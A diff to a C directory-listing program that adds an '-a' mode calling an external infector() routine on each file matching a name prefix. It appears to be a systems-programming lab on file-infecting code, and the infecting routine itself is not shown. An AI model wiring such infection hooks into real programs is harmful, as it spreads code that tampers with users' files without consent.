@@ -18,9 +18,14 @@
 #define ERR_CODE 0x55
 
 extern int system_call();
+extern void code_start();
+extern void infection(int);
+extern void infector(char *);
+extern void code_end();
 
 int DEBUG = 0;
 int PREFIX = 0;
+int APPEND = 0;
 
 struct linux_dirent
 {
@@ -36,6 +41,7 @@ void print(char *str);
 
 int main(int argc, char *argv[], char *envp[])
 {
+    
     char *prefix;
     int i;
     for (i = 1; i < argc; i++)
@@ -56,6 +62,7 @@ int main(int argc, char *argv[], char *envp[])
 
             if (argv[i][1] == 'a')
             {
+                APPEND = 1;
             }
         }
     }
@@ -98,6 +105,14 @@ int main(int argc, char *argv[], char *envp[])
                         print(dir->d_name);
                         print("\n");
                         printDirType(dirType);
+                    }
+                }
+                else if (APPEND)
+                {
+
+                    if (strlen(prefix) <= strlen(dir->d_name) && (strncmp(dir->d_name, prefix, strlen(prefix)) == 0))
+                    {
+                        infector(dir->d_name);
                     }
                 }
                 else
